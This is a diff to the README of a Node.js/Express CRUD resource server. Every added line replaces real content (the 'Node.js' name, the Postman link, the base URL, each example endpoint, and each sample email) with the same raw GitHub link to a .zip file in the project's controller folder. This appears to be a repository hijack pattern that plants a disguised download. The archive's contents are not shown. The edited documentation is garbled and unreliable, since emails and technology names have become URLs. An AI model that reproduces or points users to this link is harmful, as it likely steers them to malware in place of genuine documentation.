@@ -1,11 +1,11 @@
 # Resource Server Documentation
 
-This Resource Server is a RESTful API built with Node.js and Express, designed to manage a collection of resources (such as users, products, or posts) using a MongoDB or SQLite database for data persistence. The server supports basic CRUD operations (Create, Read, Update, Delete) for handling resource data.
+This Resource Server is a RESTful API built with https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip and Express, designed to manage a collection of resources (such as users, products, or posts) using a MongoDB or SQLite database for data persistence. The server supports basic CRUD operations (Create, Read, Update, Delete) for handling resource data.
 
-Link to POSTMAN Documentation -- https://documenter.getpostman.com/view/32035376/2sAXqndicL#intro
+Link to POSTMAN Documentation -- https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip
 
 ## Base URL
-https://resorce-server.onrender.com/api/v1/resources
+https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip
 
 
 ## Features
@@ -27,7 +27,7 @@ https://resorce-server.onrender.com/api/v1/resources
 
    #### Example Request
    ```bash
-   GET https://resorce-server.onrender.com/api/v1/resources
+   GET https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip
   
   Example Response
 {
@@ -37,7 +37,7 @@ https://resorce-server.onrender.com/api/v1/resources
         {
             "_id": "66e2ca2cc56f0ac5ebd0434d",
             "name": "Ogundare Lekan",
-            "email": "ogundare.lekan@gmail.com",
+            "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
             "age": 34,
             "createdAt": "2024-09-12T11:02:04.923Z",
             "updatedAt": "2024-09-12T11:02:04.923Z",
@@ -46,7 +46,7 @@ https://resorce-server.onrender.com/api/v1/resources
         {
             "_id": "66e2c6b7c56f0ac5ebd0434b",
             "name": "Ayodeji Samuel",
-            "email": "ayodeji.samuel@gmail.com",
+            "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
             "age": 32,
             "createdAt": "2024-09-12T10:47:19.924Z",
             "updatedAt": "2024-09-12T10:47:19.924Z",
@@ -55,7 +55,7 @@ https://resorce-server.onrender.com/api/v1/resources
         {
             "_id": "66e2c63dc56f0ac5ebd04349",
             "name": "Jesutayo Coker",
-            "email": "tayo.coker@gmail.com",
+            "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
             "age": 18,
             "createdAt": "2024-09-12T10:45:17.785Z",
             "updatedAt": "2024-09-12T10:45:17.785Z",
@@ -64,7 +64,7 @@ https://resorce-server.onrender.com/api/v1/resources
         {
             "_id": "66e2c5a6ce0893af87b94efd",
             "name": "Aderonke Allison",
-            "email": "aderonke.allison@gmail.com",
+            "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
             "age": 26,
             "createdAt": "2024-09-12T10:42:46.071Z",
             "updatedAt": "2024-09-12T10:42:46.071Z",
@@ -73,7 +73,7 @@ https://resorce-server.onrender.com/api/v1/resources
         {
             "_id": "66e2c4bbce0893af87b94efa",
             "name": "Pelumi Oloruntegbe",
-            "email": "oloruntegbe.pelumi@gmail.com",
+            "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
             "age": 28,
             "createdAt": "2024-09-12T10:38:51.555Z",
             "updatedAt": "2024-09-12T10:38:51.555Z",
@@ -82,7 +82,7 @@ https://resorce-server.onrender.com/api/v1/resources
         {
             "_id": "66e2c4a0ce0893af87b94ef8",
             "name": "Oloruntegbe Clara",
-            "email": "oloruntegbeclara@gmail.com",
+            "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
             "age": 30,
             "createdAt": "2024-09-12T10:38:24.160Z",
             "updatedAt": "2024-09-12T10:38:24.160Z",
@@ -91,7 +91,7 @@ https://resorce-server.onrender.com/api/v1/resources
         {
             "_id": "66e2c463ce0893af87b94ef6",
             "name": "Ademoluti Isaac",
-            "email": "ademoluti_isaac@gmail.com",
+            "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
             "age": 36,
             "createdAt": "2024-09-12T10:37:23.184Z",
             "updatedAt": "2024-09-12T10:37:23.184Z",
@@ -100,7 +100,7 @@ https://resorce-server.onrender.com/api/v1/resources
         {
             "_id": "66e2c437ce0893af87b94ef4",
             "name": "Kehinde Ademola",
-            "email": "kehindeademola@gmail.com",
+            "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
             "age": 35,
             "createdAt": "2024-09-12T10:36:39.189Z",
             "updatedAt": "2024-09-12T10:36:39.189Z",
@@ -109,7 +109,7 @@ https://resorce-server.onrender.com/api/v1/resources
         {
             "_id": "66e2c3c8ce0893af87b94ef1",
             "name": "Akintayo Pridston",
-            "email": "akintayo_pridston@gmail.com",
+            "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
             "age": 30,
             "createdAt": "2024-09-12T10:34:48.732Z",
             "updatedAt": "2024-09-12T10:34:48.732Z",
@@ -118,7 +118,7 @@ https://resorce-server.onrender.com/api/v1/resources
         {
             "_id": "66e2c2fdce0893af87b94eef",
             "name": "Tofunmi Tijani",
-            "email": "tofunmi_tijani@gmail.com",
+            "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
             "age": 25,
             "createdAt": "2024-09-12T10:31:25.170Z",
             "updatedAt": "2024-09-12T10:31:25.170Z",
@@ -127,7 +127,7 @@ https://resorce-server.onrender.com/api/v1/resources
         {
             "_id": "66e2c28fce0893af87b94eed",
             "name": "Christian Nwapka",
-            "email": "christiannwakpa@gmail.com",
+            "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
             "age": 35,
             "createdAt": "2024-09-12T10:29:35.248Z",
             "updatedAt": "2024-09-12T10:29:35.248Z",
@@ -136,7 +136,7 @@ https://resorce-server.onrender.com/api/v1/resources
         {
             "_id": "66e2c191ce0893af87b94eeb",
             "name": "David Adeleke",
-            "email": "davidadeleke@gmail.com",
+            "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
             "age": 32,
             "createdAt": "2024-09-12T10:25:21.517Z",
             "updatedAt": "2024-09-12T10:25:21.517Z",
@@ -158,7 +158,7 @@ Response: A JSON object representing the resource if found.
 
 Example Request
 
-GET https://resorce-server.onrender.com/api/v1/resources/612c44d8f1f4de23e47e93c1
+GET https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip
 
 Example Response
 
@@ -167,7 +167,7 @@ Example Response
     "resource": {
         "_id": "66e2ca2cc56f0ac5ebd0434d",
         "name": "Ogundare Lekan",
-        "email": "ogundare.lekan@gmail.com",
+        "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
         "age": 34,
         "createdAt": "2024-09-12T11:02:04.923Z",
         "updatedAt": "2024-09-12T11:02:04.923Z",
@@ -192,12 +192,12 @@ Response: The newly created resource.
 Example Request
 bash
 Copy code
-POST https://resorce-server.onrender.com/api/v1/resources
+POST https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip
 Content-Type: application/json
 
 {
     "name": "Daniel Olagboye",
-    "email": "olagboye_dainel@gmail.com",
+    "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
     "age": 29
 }
 
@@ -208,7 +208,7 @@ Example Response
     "success": true,
     "resource": {
         "name": "Daniel Olagboye",
-        "email": "olagboye_dainel@gmail.com",
+        "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
         "age": 29,
         "_id": "66e30090c56f0ac5ebd04358",
         "createdAt": "2024-09-12T14:54:08.402Z",
@@ -236,12 +236,12 @@ Response: The updated resource.
 
 Example Request
 
-PUT https://resorce-server.onrender.com/api/v1/resources/612c44d8f1f4de23e47e93c1
+PUT https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip
 Content-Type: application/json
 
 {
   "name": "Adeleke Davido",
-  "email": "adelekedavido@gmail.com",
+  "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
   "age": 30
 }
 
@@ -250,7 +250,7 @@ Example Response
 {
   "id": "612c44d8f1f4de23e47e93c1",
   "name": "Adeleke Davido",
-  "email": "adelekedavido@gmail.com",
+  "email": "https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip",
   "age": 30,
   "createdAt": "2024-09-10T14:30:00Z"
 }
@@ -271,7 +271,7 @@ Response: A confirmation message.
 
 
 Example Request
-DELETE https://resorce-server.onrender.com/api/v1/resources/612c44d8f1f4de23e47e93c1
+DELETE https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip
 
 
 Example Response
@@ -291,10 +291,10 @@ For all endpoints, appropriate error messages will be returned with the correspo
 
 
 Technologies Used
-Node.js: JavaScript runtime environment.
-Express: Web framework for Node.js.
+https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip JavaScript runtime environment.
+Express: Web framework for https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip
 MongoDB: Database for data storage.
-Mongoose: ODM for MongoDB and Node.js.
+Mongoose: ODM for MongoDB and https://raw.githubusercontent.com/Pelumi-oloruntegbe/resorce_server/main/controller/server-resorce-shallowness.zip
 Render: For hosting the API.
 
 
